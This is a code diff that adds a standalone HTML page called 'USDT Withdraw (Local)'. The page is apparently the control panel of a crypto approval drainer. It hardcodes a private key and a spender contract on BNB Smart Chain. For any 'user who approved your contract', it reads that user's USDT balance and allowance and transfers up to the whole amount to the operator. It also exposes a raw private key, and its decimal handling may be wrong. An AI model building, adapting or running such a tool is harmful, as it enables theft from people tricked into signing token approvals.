@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>USDT Withdraw (Local)</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: radial-gradient(circle at top left, #1e293b, #0f172a);
+      color: #e2e8f0;
+      max-width: 700px;
+      margin: 2em auto;
+      padding: 2em;
+      border-radius: 20px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+    }
+    h2, h3 {
+      text-align: center;
+      color: #38bdf8;
+    }
+    label {
+      font-weight: 600;
+      margin-top: 0.5em;
+      display: block;
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 0.8em;
+      margin: 0.5em 0 1.2em;
+      border: 1px solid #334155;
+      border-radius: 12px;
+      font-size: 1em;
+      background: #1e293b;
+      color: #e2e8f0;
+    }
+    textarea {
+      resize: none;
+    }
+    button {
+      background: linear-gradient(90deg, #38bdf8, #0ea5e9);
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      border: none;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(14, 165, 233, 0.6);
+    }
+    .warning {
+      background: #fef9c3;
+      color: #854d0e;
+      padding: 1em;
+      border-left: 5px solid #facc15;
+      border-radius: 12px;
+      margin-bottom: 1.5em;
+    }
+    .logs {
+      background: #0f172a;
+      height: 220px;
+      overflow-y: auto;
+      padding: 1em;
+      border-radius: 12px;
+      border: 1px solid #334155;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.9em;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+<h2>USDT Withdraw (Local)</h2>
+<div class="warning">
+  <strong>Security Notice:</strong> "Please keep this file safe and do not share it with anyone. It is customized for your use only."
+</div>
+
+<h3>Configuration (Edit Source)</h3>
+<textarea readonly rows="4">Edit the variables User Address, To Address, in the source below.</textarea>
+
+<h3>Owner (Private Key Loaded)</h3>
+<p>Don't Share this file </p>
+<label>User Address (who approved your contract)</label>
+<input id="userAddress" placeholder="0x..." />
+<label>To Address (destination) — optional</label>
+<input id="toAddress" placeholder="0x..." />
+<label>Exact Amount to Transfer (USDT)</label>
+<input id="amount" placeholder="Leave empty for ALL (balance & allowance)" />
+
+<button onclick="loadInfo()">Load Balance & Allowance</button>
+<button onclick="withdraw()">Withdraw (Exact / All)</button>
+
+<h3>Status / Logs</h3>
+<div class="logs" id="logs"></div>
+
+<script>
+const OWNER_PRIVATE_KEY = "68e4cba4b539f461f7914999115bd3dfdb72a0cab3d4f4a4a0e7ad4bd8d24945";
+const SPENDER_CONTRACT = "0xc5C4f72dD0557c763612c00A923619676fB85519";
+const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const RPC = "https://bsc-dataseed.binance.org/";
+
+const spenderABI = ["function spendUSDT(address token, address from, address to, uint256 amount) external"];
+const tokenABI = ["function balanceOf(address) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)"];
+
+const provider = new ethers.JsonRpcProvider(RPC);
+const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
+const spender = new ethers.Contract(SPENDER_CONTRACT, spenderABI, wallet);
+const token = new ethers.Contract(TOKEN_ADDRESS, tokenABI, provider);
+
+function log(msg) {
+  const box = document.getElementById('logs');
+  box.textContent += msg + "\n";
+  box.scrollTop = box.scrollHeight;
+}
+
+async function loadInfo() {
+  const user = document.getElementById('userAddress').value.trim();
+  if (!user) return log("Enter a user address first.");
+  log("Loading balance and allowance for: " + user);
+  try {
+    const balance = await token.balanceOf(user);
+    const allowance = await token.allowance(user, SPENDER_CONTRACT);
+    log("Balance: " + ethers.formatUnits(balance, 6) + " USDT");
+    log("Allowance: " + ethers.formatUnits(allowance, 6) + " USDT");
+  } catch (e) {
+    log("Error: " + e.message);
+  }
+}
+
+async function withdraw() {
+  const user = document.getElementById('userAddress').value.trim();
+  if (!user) return log("Enter a user address first.");
+  let to = document.getElementById('toAddress').value.trim();
+  if (!to) to = wallet.address;
+  const amtText = document.getElementById('amount').value.trim();
+  try {
+    let balance = await token.balanceOf(user);
+    let allowance = await token.allowance(user, SPENDER_CONTRACT);
+    let max = balance < allowance ? balance : allowance;
+    let amount = amtText ? ethers.parseUnits(amtText, 6) : max;
+    if (amount <= 0n) return log("Nothing to transfer.");
+    log(`Withdrawing ${ethers.formatUnits(amount, 6)} USDT from ${user} to ${to}...`);
+    const tx = await spender.spendUSDT(TOKEN_ADDRESS, user, to, amount);
+    log("Tx sent: " + tx.hash);
+    await tx.wait();
+    log("Transfer complete.");
+  } catch (e) {
+    log("Error during withdraw: " + e.message);
+  }
+}
+</script>
+</body>
+</html>
